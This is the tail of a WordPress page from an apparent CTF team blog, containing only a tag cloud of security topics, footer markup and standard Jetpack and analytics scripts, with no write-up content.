<a href="../../tag/operatormac/index.html" class="tag-cloud-link tag-link-44 tag-link-position-11" style="font-size: 8pt;" aria-label="OperatorMac (1 item)">OperatorMac</a>
<a href="../../tag/pwn/index.html" class="tag-cloud-link tag-link-27 tag-link-position-12" style="font-size: 8pt;" aria-label="pwn (1 item)">pwn</a>
<a href="../../tag/re/index.html" class="tag-cloud-link tag-link-26 tag-link-position-13" style="font-size: 8pt;" aria-label="re (1 item)">re</a>
<a href="../../tag/side-channel/index.html" class="tag-cloud-link tag-link-29 tag-link-position-14" style="font-size: 8pt;" aria-label="side-channel (1 item)">side-channel</a>
<a href="../../tag/sqli/index.html" class="tag-cloud-link tag-link-41 tag-link-position-15" style="font-size: 8pt;" aria-label="sqli (1 item)">sqli</a>
<a href="../../tag/unserialize/index.html" class="tag-cloud-link tag-link-40 tag-link-position-16" style="font-size: 8pt;" aria-label="unserialize (1 item)">unserialize</a>
<a href="../../tag/xss/index.html" class="tag-cloud-link tag-link-39 tag-link-position-17" style="font-size: 8pt;" aria-label="xss (1 item)">xss</a></div>
</aside>			</div><!-- .widget-area -->
		</div><!-- .sidebar-inner -->
	</div><!-- #tertiary -->

		</div><!-- #main -->
		<footer id="colophon" class="site-footer" role="contentinfo">
			
			<div class="site-info">
								<a href="https://wordpress.org/">Proudly powered by WordPress</a>
			</div><!-- .site-info -->
		</footer><!-- #colophon -->
	</div><!-- #page -->

		<div style="display:none">
	</div>
<script type='text/javascript' src='../../wp-content/plugins/jetpack/_inc/build/photon/photon.min.js%3Fver=20190201'></script>
<script type='text/javascript' src='https://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=202333'></script>
<script type='text/javascript' src='../../wp-content/themes/twentythirteen/js/functions.js%3Fver=20160717'></script>
<script type='text/javascript' src='../../wp-includes/js/wp-embed.min.js%3Fver=5.2.2'></script>
<script type='text/javascript' src='../../wp-content/plugins/jetpack/_inc/build/spin.min.js%3Fver=1.3'></script>
<script type='text/javascript' src='../../wp-content/plugins/jetpack/_inc/build/jquery.spin.min.js%3Fver=1.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var jetpackCarouselStrings = {"widths":[370,700,1000,1200,1400,2000],"is_logged_in":"","lang":"en","ajaxurl":"https:\/\/babyphd.net\/wp-admin\/admin-ajax.php","nonce":"5cd6f523b0","display_exif":"1","display_geo":"1","single_image_gallery":"1","single_image_gallery_media_file":"","background_color":"black","comment":"Comment","post_comment":"Post Comment","write_comment":"Write a Comment...","loading_comments":"Loading Comments...","download_original":"View full size <span class=\"photo-size\">{0}<span class=\"photo-size-times\">\u00d7<\/span>{1}<\/span>","no_comment_text":"Please be sure to submit some text with your comment.","no_comment_email":"Please provide an email address to comment.","no_comment_author":"Please provide your name to comment.","comment_post_error":"Sorry, but there was an error posting your comment. Please try again later.","comment_approved":"Your comment was approved.","comment_unapproved":"Your comment is in moderation.","camera":"Camera","aperture":"Aperture","shutter_speed":"Shutter Speed","focal_length":"Focal Length","copyright":"Copyright","comment_registration":"0","require_name_email":"1","login_url":"https:\/\/babyphd.net\/wp-login.php?redirect_to=https%3A%2F%2Fbabyphd.net%2F2015%2F05%2F12%2Fasis-quals-ctf-2015-grids-writeup%2F","blog_id":"1","meta_data":["camera","aperture","shutter_speed","focal_length","copyright"],"local_comments_commenting_as":"<fieldset><label for=\"email\">Email (Required)<\/label> <input type=\"text\" name=\"email\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-email-field\" \/><\/fieldset><fieldset><label for=\"author\">Name (Required)<\/label> <input type=\"text\" name=\"author\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-author-field\" \/><\/fieldset><fieldset><label for=\"url\">Website<\/label> <input type=\"text\" name=\"url\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-url-field\" \/><\/fieldset>"};
/* ]]> */
</script>
<script type='text/javascript' src='../../wp-content/plugins/jetpack/_inc/build/carousel/jetpack-carousel.min.js%3Fver=20190102'></script>
<script type='text/javascript' src='https://stats.wp.com/e-202333.js' async='async' defer='defer'></script>
<script type='text/javascript'>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:7.5.2',blog:'104079289',post:'0',tz:'0',srv:'babyphd.net'} ]);
	_stq.push([ 'clickTrackerInit', '104079289', '0' ]);
</script>
</body>
</html>